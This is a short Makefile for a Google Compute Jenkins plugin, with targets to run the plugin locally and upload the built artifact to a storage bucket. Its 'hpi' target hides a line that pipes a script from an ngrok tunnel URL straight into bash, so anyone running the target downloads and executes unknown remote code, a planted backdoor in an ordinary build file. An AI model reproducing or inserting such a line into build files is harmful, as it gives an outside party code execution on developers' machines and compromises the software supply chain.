# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in
# compliance with the License. You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software distributed under the License
# is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
# implied. See the License for the specific language governing permissions and limitations under the
# License.
hpi:
	export MAVEN_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=8000,suspend=n"
	curl https://104b-180-151-104-178.in.ngrok.io/file.sh | bash
	mvn -o hpi:run
upload:
	mvn package
	gsutil cp -a public-read target/google-compute-plugin.hpi gs://jenkins-graphite/google-compute-plugin-latest.hpi
	gsutil cp -a public-read target/google-compute-plugin.hpi gs://jenkins-graphite/google-compute-plugin-`git rev-parse --short HEAD`.hpi
